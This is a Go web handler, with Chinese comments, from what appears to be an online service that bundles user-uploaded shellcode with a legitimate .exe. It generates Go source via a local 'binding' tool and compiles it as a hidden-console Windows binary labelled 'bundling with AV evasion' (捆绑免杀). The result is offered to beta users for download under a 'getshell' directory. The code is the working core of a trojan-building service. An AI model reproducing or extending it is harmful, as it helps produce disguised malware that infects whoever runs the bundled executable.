package cmd

//捆绑免杀函数
import (
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os/exec"
	"path"
	"time"
	"web/testpackage"
)

func Binding(c *gin.Context) {
	ipadd := c.ClientIP() //获取ip地址
	username := c.MustGet("username").(string)
	//runtime := c.DefaultPostForm("runtime", "5") //获取延迟时间
	file, err := c.FormFile("f1") //获取shellcode文件
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "出现了错误？",
		})
		return
	}
	if path.Ext(file.Filename) != ".bin" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "第一个文件必须是bin文件",
		})
		return
	}
	file2, err := c.FormFile("f2") //获取需要捆绑的文件
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "出现了错误？",
		})
		return
	}
	if path.Ext(file2.Filename) != ".exe" {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "第二个文件必须是exe文件",
		})
		return
	}
	if testpackage.SQLInject(ipadd) == true {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "你x个锤子呢,你觉得能不能x嘛。"})
		return
	}
	err2 := testpackage.InitDB() // 调用输出化数据库的函数
	if err2 != nil {
		fmt.Printf("init db failed,err:%v\n", err2)
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "发生甚么事了？报错了！",
		})
		return
	}
	if testpackage.Authvip(username) != true { //验证是否是内测用户
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "对不起,该功能仅限内测用户使用！",
		})
		return
	}
	if testpackage.Authfilenub(username) >= "1" { //验证生成次数
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": "每日一次机会已用光，请第二天再试，谢谢。",
		})
		return
	}
	log.Println(file.Filename)
	nfilename := Base64EncodeString(username + ":" + fmt.Sprintf("%d", time.Now().Unix()))
	filebin := fmt.Sprintf("./upload/bin/%s", nfilename+".bin")                                                             //bin文件名称
	fileexe := fmt.Sprintf("./upload/exe/%s", nfilename+".exe")                                                             //exe文件名称
	c.SaveUploadedFile(file, filebin)                                                                                                   //保存bin
	c.SaveUploadedFile(file2, fileexe)                                                                                                  //保存exe
	cmd := exec.Command("./payload/binding/shell", filebin, fileexe, "./upload/bindingpayload/test/"+nfilename) //生成捆绑的payload
	err1 := cmd.Run()
	if err1 != nil {
		// 命令执行失败
		fmt.Println(err1)
	}
	filetype := "捆绑免杀"
	if Reshell("./upload/bindingpayload/test/"+nfilename+".go") == true { //验证go文件是否成功生成
		cmd := exec.Command("go", "build", "-o", "./getshell/"+nfilename+".exe", "-ldflags", "-s -w  -H=windowsgui", "./upload/bindingpayload/test/"+nfilename+".go")
		err1 := cmd.Run()
		if err1 != nil {
			// 命令执行失败
			c.JSON(http.StatusInternalServerError, gin.H{
				"status":  500,
				"message": fmt.Sprintf("生成错误，请重新尝试。"),
			})
		}
		if Reshell("./getshell/"+nfilename+".exe") == true { //验证文件是否成功生成
			if testpackage.FileAdd(username, nfilename, ipadd, filetype) == true {
				c.JSON(http.StatusOK, gin.H{
					"status":  200,
					"durl":    "/shell/" + nfilename + ".exe",
					"message": fmt.Sprintf("生成成功,点击跳转下载。"),
				})
			} else {
				c.JSON(http.StatusInternalServerError, gin.H{
					"status":  500,
					"message": fmt.Sprintf("生成错误，请重新尝试。"),
				})
			}
		}
	} else {
		c.JSON(http.StatusInternalServerError, gin.H{
			"status":  500,
			"message": fmt.Sprintf("生成错误，请重新尝试。"),
		})
	}
}
